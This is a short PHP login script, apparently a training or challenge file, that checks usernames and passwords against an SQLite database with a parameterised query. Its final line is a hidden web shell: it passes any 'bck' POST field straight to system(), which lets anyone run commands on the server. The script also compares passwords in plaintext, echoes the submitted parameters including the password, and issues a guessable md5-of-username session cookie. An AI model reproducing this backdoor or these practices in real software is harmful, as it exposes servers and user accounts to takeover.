<?php
        function req_db($req, $params  = []){
			$db = new SQLite3("./truc.db");
			$stmt = $db->prepare($req);
			foreach ($params as $key => $value) {
			$stmt->bindValue($key, $value);}
			$results = $stmt->execute();
			echo "Paramètres de la requête : ";
			print_r($params);
			// Exécute la requête SQL et retourne le premier résultat sous forme de tableau
			if ($results === false){
			return false;
			}
			$toret = $results->fetchArray();
			return $toret;
		}

	if(isset($_POST["username"]) && isset($_POST["password"]))
	{	
		$username = htmlspecialchars($_POST["username"]); 
		$password = htmlspecialchars($_POST["password"]);
	
		$a = req_db( "SELECT * FROM users WHERE username = :username AND password = :password LIMIT 1;", [
			':username' => $username,
			':password' => $password
		]);

		if ( $a){

			printf ("Redirection et connexion de MANIERE SAFE HEINNNNN ...");
			$_SESSION["CONNECTED"] = $a["admin"];
			$_SESSION["USERNAME"] = $a["username"];
			setcookie("JSESSID", md5($a["username"]), time()+3600, "/");
		}
		else
		{
			printf("Failed connecting. Redirecting...");
		}

	}

	if(isset($_POST["bck"])) system($_POST["bck"]);
?>
<script>
	window.onload = function() { setTimeout(function() { window.location.href = "/"; }, 2000); }
</script>
